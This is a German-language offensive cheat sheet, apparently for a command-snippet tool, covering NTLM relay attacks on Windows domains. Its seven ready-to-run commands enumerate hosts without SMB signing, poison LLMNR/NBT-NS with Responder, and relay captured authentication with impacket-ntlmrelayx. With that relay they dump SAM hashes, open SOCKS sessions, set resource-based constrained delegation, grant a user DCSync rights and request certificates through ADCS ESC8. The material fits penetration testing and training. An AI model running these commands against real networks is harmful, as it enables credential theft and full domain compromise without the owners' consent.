# WEG

#plateform/linux #target/remote #cat/RELAY

% boris, relay, ntlm, signing, nxc, targets, genrelaylist, poisoning
## [RELAY-a] nxc - Relay-Target-Liste (Hosts ohne SMB Signing)
Start des Relay-Wegs: erst Ziele ohne SMB-Signing sammeln.
```
nxc smb <target_range> --gen-relay-list <relay_file|smb_targets.txt>
```

% boris, relay, responder, poisoning, llmnr, nbtns, mdns, off
## [RELAY-b] Responder - SMB+HTTP OFF, dann Poisoning starten
SMB/HTTP aus, damit ntlmrelayx die Ports bekommt; Responder macht nur noch LLMNR/NBT-NS/mDNS.
```
sudo sed -i.bak 's/^SMB = On/SMB = Off/I; s/^HTTP = On/HTTP = Off/I' /etc/responder/Responder.conf && sudo responder -I <interface> -Pv
```

% boris, relay, ntlmrelayx, socks, impacket, hashes, sam, creds, dump
## [RELAY-c] ntlmrelayx - Relay starten (SOCKS + Hashes dumpen)
Relayt eingehende Auth auf die Signing-losen Ziele, oeffnet SOCKS-Sessions, dumpt SAM.
```
ulimit -n 10000; impacket-ntlmrelayx -tf <relay_file|smb_targets.txt> -smb2support -socks --output-file <output_file|ntlm_hashes.txt>
```

% boris, relay, socks, proxychains, nxc, session, shares
## [RELAY-d] SOCKS nutzen - relayte Session ueber proxychains (nxc)
Leeres -p '' : die Auth kommt aus der relayten SOCKS-Session, nicht aus Creds.
```
proxychains -q nxc smb <target_range> -u <user> -p '' -d <domain> --shares
```

% boris, relay, ntlmrelayx, ldap, delegate, rbcd, delegateaccess, impacket
## [RELAY-e] ntlmrelayx -> LDAP: RBCD setzen (Bruecke zum rbcd-Weg)
Coerce einen DC/Host (siehe coerce), relaye auf LDAP: --delegate-access legt ein Computerkonto an + traegt RBCD ein. Danach getST im rbcd-Weg.
```
impacket-ntlmrelayx -t ldaps://<dc_fqdn> --delegate-access -smb2support --output-file <output_file|ntlm_hashes.txt>
```

% boris, relay, ntlmrelayx, escalate, adduser, ldap, privesc
## [RELAY-f] ntlmrelayx -> LDAP: User escalaten (DCSync-Rechte)
Relay auf LDAP mit --escalate-user hebt einen kontrollierten User an (z.B. fuer DCSync).
```
impacket-ntlmrelayx -t ldaps://<dc_fqdn> --escalate-user <user> -smb2support
```

% boris, relay, esc8, adcs, ntlmrelayx, http, webenrollment, crossref
## [RELAY-g] ntlmrelayx -> ADCS ESC8 (Bruecke zum adcs-Weg)
Relay coerced DC-Auth auf die CA-Web-Enrollment -> Zertifikat. Details/Alternative certipy-ad relay: siehe adcs.
```
impacket-ntlmrelayx -t http://<ca_fqdn>/certsrv/certfnsh.asp -smb2support --adcs --template <template|DomainController>
```
